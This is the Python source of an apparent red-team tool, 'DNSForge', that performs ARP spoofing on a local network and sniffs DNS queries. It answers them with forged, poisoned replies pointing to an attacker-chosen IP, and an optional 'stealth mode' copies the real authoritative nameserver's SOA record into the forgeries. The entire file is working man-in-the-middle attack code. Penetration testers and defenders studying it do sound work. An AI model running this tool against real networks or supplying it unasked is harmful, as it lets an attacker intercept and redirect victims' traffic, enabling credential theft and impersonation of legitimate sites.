#############################################################################
#   Copyright 2024 Aon plc
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#############################################################################

import argparse
import ipaddress
import logging as log
import os
import socket
import sys
import threading
from contextlib import suppress

import netifaces
from scapy.all import (
    ARP,
    DNS,
    DNSQR,
    DNSRR,
    DNSRRSOA,
    IP,
    UDP,
    Ether,
    sendp,
    sniff,
    sr1,
    srp,
)
from termcolor import colored

from .attack_state import AttackState as state


def banner():
    print(
        r"""
 ______   ____  _____   ______   ________                              
|_   _ `.|_   \|_   _|.' ____ \ |_   __  |                             
  | | `. \ |   \ | |  | (___ \_|  | |_ \_|.--.   _ .--.  .--./) .---.  
  | |  | | | |\ \| |   _.____`.   |  _| / .'`\ \[ `/'`\]/ /'`\;/ /__\\ 
 _| |_.' /_| |_\   |_ | \____) | _| |_  | \__. | | |    \ \._//| \__., 
|______.'|_____|\____| \______.'|_____|  '.__.' [___]   .',__`  '.__.' 
                                                       ( ( __))        
Author : Apurva Goenka
Version : 0.2.1
    """
    )


def req_dns_soa():
    args = parse_args()
    dns_request = (
        IP(dst=args.dns_server)
        / UDP(dport=53)
        / DNS(rd=1, qd=DNSQR(qname=args.domain, qtype="AAAA"))
    )
    # Send DNS request to request SOA
    log.info(
        colored("[*] Requesting SOA record from authoritative DNS server", "green")
    )
    received = sr1(dns_request, verbose=0)
    if received and DNS in received and received[DNS].nscount > 0:
        log.info(colored("[+] Captured Authoritative Nameserver Signature", "yellow"))
        log.debug(received[DNSRRSOA].show(dump=True))
        return received[DNSRRSOA]
    else:
        log.error(
            colored("[!] Failed to capture Authoritative Nameserver Signature", "red")
        )
        return


def arp_request(net_interface, target_ip):
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip)
    received = srp(broadcast_packet, iface=net_interface, timeout=2, verbose=0)
    if received:
        try:
            return received[0][0][1].hwsrc
        except IndexError:
            return
    else:
        return


def arp_spoof(net_interface, target_ip):
    # Backup original ARP cache
    orig_hwdst = arp_request(net_interface, target_ip)
    if orig_hwdst:
        log.info(
            colored(f"[*] Backed up ARP cache for {target_ip} - {orig_hwdst}", "green")
        )
        state.set_arp_cache(target_ip, orig_hwdst)
    spoof_hwdst = netifaces.ifaddresses(str(net_interface))[netifaces.AF_LINK][0][
        "addr"
    ]
    spoof_packet = Ether(src=spoof_hwdst, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, hwsrc=spoof_hwdst, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"
    )
    log.info(colored(f"[*] Spoofing ARP: {target_ip} is at {spoof_hwdst}", "green"))
    # Continuously spoof ARP until process is killed
    sendp(spoof_packet, iface=net_interface, verbose=0, loop=1, inter=1)


def arp_restore(net_interface, target_ip):
    cached_hw = state.get_arp_cache()[target_ip]
    # Restore original ARP cache
    restore_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        hwsrc=cached_hw,
        psrc=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )
    sendp(restore_packet, iface=net_interface, verbose=0)
    log.info(colored(f"[*] Restored ARP cache for {target_ip} - {cached_hw}", "green"))


def dns_forge(packet, args):
    net_interface = args.interface
    query_filter = args.query_name
    ttl = args.time_to_live
    dns_nxdomain = False

    # Ignore packet if no DNS query present
    if DNSQR not in packet or not packet.dport == 53:
        return

    dns_layer = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=0,
        rd=1,
        qr=1,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
    )

    log.info(colored(f"[*] Found DNS request from {packet[IP].src}", "yellow"))
    query = packet[DNSQR].qname.decode("utf-8")
    if query_filter and not any(q in query for q in query_filter):
        log.info(
            f"[-] Query: {query} does not match filter - responding with correct IP"
        )

        if query not in state.get_dns_cache():
            log.debug(colored(f"[*] Resolving query {query}", "green"))

            try:
                dns_lookup = socket.gethostbyname(query)
            except socket.gaierror:
                log.error(
                    colored(
                        f"[!] Cannot resolve query {query} - responding with NXDomain",
                        "red",
                    )
                )
                # Modify base packet
                dns_layer.rcode = 3
                dns_nxdomain = True

            if not dns_nxdomain:
                resp_ip = dns_lookup
                # Cache IP for future requests
                state.set_dns_cache(query, dns_lookup)
        else:
            log.debug(colored(f"[*] DNS cache hit for {query}", "green"))
            resp_ip = state.get_dns_cache()[query]
        if not dns_nxdomain:
            log.info(
                colored(f"[*] Responding to query {query} with IP {resp_ip}", "green")
            )
        else:
            log.info(colored(f"[*] Responding to query {query} with NXDomain", "green"))
    else:
        resp_ip = args.poison_ip
        log.info(colored(f"[*] Poisoning query {query} with IP {resp_ip}", "green"))

    if not dns_nxdomain:
        dns_layer.rcode = 0
        dns_layer.ancount = 1
        dns_layer.an = DNSRR(
            rrname=packet[DNS].qd.qname, type="A", ttl=ttl, rdata=resp_ip
        )

    response_packet = (
        Ether(src=packet[Ether].dst, dst=packet[Ether].src)
        / IP(src=packet[IP].dst, dst=packet[IP].src)
        / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
        / dns_layer
    )

    # Modify packet if stealth mode enabled
    if state.get_authoritative_nameservers() and args.stealth:
        log.info(colored(f"[+] Forged Authoritative Nameserver Signature", "yellow"))
        response_packet[DNS].nscount = 1
        response_packet[DNS].ns = state.get_authoritative_nameservers()

    # Send the DNS response
    sendp(response_packet, iface=net_interface, verbose=False)
    log.info(colored(f"[+] Sent Forged/Poisoned Packet to {packet[IP].src}", "yellow"))
    log.debug(response_packet[DNS].show(dump=True))


def validate_arp_spoof_targets(arp_target, net_interface):
    if arp_target:
        iface_info = netifaces.ifaddresses(net_interface)[netifaces.AF_INET][0]
        iface_ip = iface_info["addr"]
        netmask = iface_info["netmask"]
        gateway = None

        # Determine gateway
        for gw_ip, gw_iface, is_default in netifaces.gateways()[netifaces.AF_INET]:
            if net_interface == gw_iface:
                gateway = gw_ip
                break
        if not gateway:
            log.error(
                colored(
                    f"[!] Cannot find gateway for interface {net_interface} - exiting..",
                    "red",
                )
            )
            sys.exit(1)

        subnet = ipaddress.IPv4Network(f"{iface_ip}/{netmask}", strict=False)
        valid_arp_target = set()
        for target in arp_target:
            if ipaddress.IPv4Address(target) not in subnet:
                log.info(
                    colored(
                        f"[*] Target {target} is not within the same subnet - targeting gateway {gateway} instead",
                        "green",
                    )
                )
                # check IP forwarding before proceeding
                if not check_ip_forwarding():
                    resp = (
                        input(
                            colored(
                                "[*] The subnet gateway is targeted for ARP spoofing but IP forwarding isn't detected - continue anyway? (Y/n): ",
                                "yellow",
                            )
                        )
                        .strip()
                        .lower()
                    )
                    if resp not in ["y", ""]:
                        log.error(
                            colored(
                                "[!] Removing gateway from ARP spoofing targets",
                                "red",
                            )
                        )
                        continue
                valid_arp_target.add(gateway)
            else:
                valid_arp_target.add(target)
        return valid_arp_target


def check_ip_forwarding():
    with suppress(FileNotFoundError):
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            status = f.read().strip()
            if status == "1":
                return True
            else:
                return False


def parse_args():
    # Parse Arguments
    parser = argparse.ArgumentParser(
        description="DNS Response Forger",
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        help="Interface to sniff/poison on",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--poison-ip",
        type=str,
        help="IP address to forge/poison DNS response",
        required=True,
    )
    parser.add_argument(
        "-ttl",
        "--time-to-live",
        type=int,
        help="TTL (seconds) for poisoned DNS response",
        required=False,
        default=300,
    )
    parser.add_argument(
        "-q",
        "--query-name",
        type=str,
        help="DNS Query Name to Poison (can specify multiple by separating with ',')",
        required=False,
    )
    parser.add_argument(
        "-s", "--stealth", help="Stealth Mode", required=False, action="store_true"
    )
    parser.add_argument(
        "-v", "--verbose", help="Verbose Output", required=False, action="store_true"
    )
    stealth_group = parser.add_argument_group("Stealth Mode")
    stealth_group.add_argument(
        "-ds", "--dns-server", type=str, help="IP address of Authoritative DNS Server"
    )
    stealth_group.add_argument(
        "-d", "--domain", type=str, help="The domain name of the victim domain"
    )
    arpspoof_group = parser.add_argument_group("ARP Spoofing")
    arpspoof_group_ex = arpspoof_group.add_mutually_exclusive_group(required=True)
    arpspoof_group_ex.add_argument(
        "-t", "--target", type=str, help="ARP spoofing target IP"
    )
    arpspoof_group_ex.add_argument(
        "-tf", "--target-file", type=str, help="ARP spoofing target IP list"
    )
    arpspoof_group_ex.add_argument(
        "--no-arp-spoof", help="Turn off ARP spoofing", action="store_true"
    )

    args = parser.parse_args()

    if args.stealth and (args.dns_server is None or args.domain is None):
        parser.error("-s/--stealth requires -ds/--dns-server and -d/--domain")

    return args


def main():
    banner()
    args = parse_args()

    # Setup Logging
    if args.verbose:
        log.basicConfig(format="%(message)s", level=log.DEBUG)
    else:
        log.basicConfig(format="%(message)s", level=log.INFO)

    # Check root privileges
    if os.geteuid() != 0:
        log.error(colored("[!] Please run as root", "red"))
        sys.exit(1)

    # Check network interface
    try:
        if netifaces.AF_INET in netifaces.ifaddresses(args.interface):
            net_interface = args.interface
    except ValueError:
        log.error(colored("[!] Invalid network interface supplied", "red"))
        sys.exit(1)

    # Stealth mode
    if args.stealth:
        log.info(colored("[*] Stealth mode activated", "green"))
        log.debug(
            colored("[*] Capturing Authoritative Nameserver Signature...", "green")
        )
        authoritative_nameservers = req_dns_soa()
        state.set_authoritative_nameservers(authoritative_nameservers)

    # Check ARP spoofing targets
    if args.target:
        arp_target = [args.target]
    elif args.target_file:
        if os.path.exists(args.target_file):
            with open(args.target_file, "r") as tf:
                arp_target = [target.strip() for target in tf.readlines()]
        else:
            log.error(
                colored(f"[!] Invalid targets file supplied: {args.target_file}", "red")
            )
            sys.exit(1)

    arp_target = validate_arp_spoof_targets(arp_target, net_interface)
    if not arp_target:
        log.error(colored("[!] ARP spoofing targets missing - exiting..", "red"))
        sys.exit(1)

    # Setup ARP spoofing
    if not args.no_arp_spoof:
        for target in arp_target:
            arpspoof_thread = threading.Thread(
                target=arp_spoof,
                args=(
                    net_interface,
                    target,
                ),
            )
            arpspoof_thread.daemon = True
            arpspoof_thread.start()

    # Setup DNS Forging/Poisoning
    iface_ip = netifaces.ifaddresses(net_interface)[netifaces.AF_INET][0]["addr"]
    dns_req_packet_filter = " and ".join(
        ["udp dst port 53", "udp[10] & 0x80 = 0", f"not src host {iface_ip}"]
    )
    log.info(colored("[*] Forging/Poisoning DNS responses", "green"))
    if args.query_name:
        args.query_name = args.query_name.split(",")
        log.info(colored(f"[*] Filtering DNS requests for {args.query_name}", "green"))
    else:
        log.info(
            colored(
                "[*] No query filter supplied - responding to all DNS requests",
                "yellow",
            )
        )
    sniff(
        filter=dns_req_packet_filter,
        prn=lambda packet: dns_forge(packet, args),
        store=0,
        iface=net_interface,
    )
    log.info(colored("[!] Ctrl-C detected, killing..", "red"))
    if not args.no_arp_spoof:
        log.info(colored("[*] Re-arping targets", "green"))
        for target in arp_target:
            if target in state.get_arp_cache():
                arp_restore(net_interface, target)


if __name__ == "__main__":
    main()
